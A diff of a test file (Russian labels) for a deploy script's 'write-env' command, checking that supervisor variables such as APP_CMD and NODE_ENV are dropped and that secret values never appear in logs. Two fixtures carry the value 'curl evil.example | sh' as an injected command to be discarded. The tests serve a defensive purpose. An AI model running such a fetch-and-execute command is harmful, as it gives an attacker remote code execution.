@@ -390,12 +390,55 @@ describe('deploy/vps/ops.sh', () => {
       expect(read('.env')).toBe(
         'BOT_TOKEN=12345:AAA$bbb#ccc\nENCRYPTION_KEY=deadbeef\n',
       );
-      expect(res.stdout).toMatch(/переменных 2, отброшено 3/);
+      expect(res.stdout).toMatch(
+        /переменных 2, отброшено 3: DATABASE_URL RECOVER_CMD TRANSFER_TARGET_URL\n/,
+      );
       expect(res.stdout + res.stderr).not.toMatch(/AAA|deadbeef|amvera/);
       const mode = spawnSync('stat', ['-c', '%a', join(base(), '.env')], {
         encoding: 'utf8',
       });
       expect(mode.stdout.trim()).toBe('600');
+    });
+
+    it('ручки супервизора и NODE_ENV из PROD_ENV не доходят до контейнера: имена в логе, значений нет; настоящие переменные приложения проходят', () => {
+      const input = [
+        'NODE_ENV=development',
+        'PORT=80',
+        'APP_PORT=9',
+        'APP_CMD=curl evil.example | sh',
+        'MIGRATE_CMD=true',
+        'STARTUP_MAX_FAILS=1',
+        'STARTUP_COOLDOWN_MS=1',
+        'STARTUP_COOLDOWN_MAX_MS=1',
+        'DEPLOY_TARGET=amvera',
+        'DB_WAIT_TIMEOUT_MS=1',
+        'BOT_TOKEN=12345:AAA',
+        'ENCRYPTION_KEY=deadbeef',
+        'SKIP_AUTH=1',
+        'B2_KEY_ID=keyid',
+        'MY_PORT=1',
+        'NODE_ENV_EXTRA=1',
+      ].join('\n');
+
+      const res = ops(['write-env'], {}, input + '\n');
+
+      expect(res.status).toBe(0);
+      expect(read('.env')).toBe(
+        [
+          'BOT_TOKEN=12345:AAA',
+          'ENCRYPTION_KEY=deadbeef',
+          'SKIP_AUTH=1',
+          'B2_KEY_ID=keyid',
+          'MY_PORT=1',
+          'NODE_ENV_EXTRA=1',
+        ].join('\n') + '\n',
+      );
+      expect(res.stdout).toMatch(
+        /переменных 6, отброшено 10: APP_CMD APP_PORT DB_WAIT_TIMEOUT_MS DEPLOY_TARGET MIGRATE_CMD NODE_ENV PORT STARTUP_COOLDOWN_MAX_MS STARTUP_COOLDOWN_MS STARTUP_MAX_FAILS\n/,
+      );
+      expect(res.stdout + res.stderr).not.toMatch(
+        /evil|development|=80|=9\b|deadbeef|AAA/,
+      );
     });
 
     it('строка не вида KEY=value → отказ без перезаписи .env; в сообщении только номер строки', () => {
@@ -409,8 +452,31 @@ describe('deploy/vps/ops.sh', () => {
       expect(read('.env')).toBe('OLD=1\n');
     });
 
-    it('пустой ввод → отказ', () => {
-      expect(ops(['write-env'], {}, '\n').status).toBe(1);
+    it('пустой ввод → отказ с сообщением «PROD_ENV пуст»', () => {
+      const res = ops(['write-env'], {}, '\n');
+
+      expect(res.status).toBe(1);
+      expect(res.stderr).toContain('PROD_ENV пуст');
+    });
+
+    it('в секрете только отбрасываемые строки → отказ без «пуст», с именами (не значениями), старый .env цел', () => {
+      writeFileSync(join(base(), '.env'), 'OLD=1\n');
+      const input = [
+        'NODE_ENV=development',
+        'APP_CMD=curl evil.example | sh',
+        'DATABASE_URL=postgresql://user:SECRETPW@amvera/old',
+      ].join('\n');
+
+      const res = ops(['write-env'], {}, input + '\n');
+
+      expect(res.status).toBe(1);
+      expect(res.stderr).toContain('остались только переменные');
+      expect(res.stderr).toContain('APP_CMD DATABASE_URL NODE_ENV');
+      expect(res.stderr).not.toContain('PROD_ENV пуст');
+      expect(res.stdout + res.stderr).not.toMatch(
+        /development|evil|SECRETPW|amvera/,
+      );
+      expect(read('.env')).toBe('OLD=1\n');
     });
   });
 
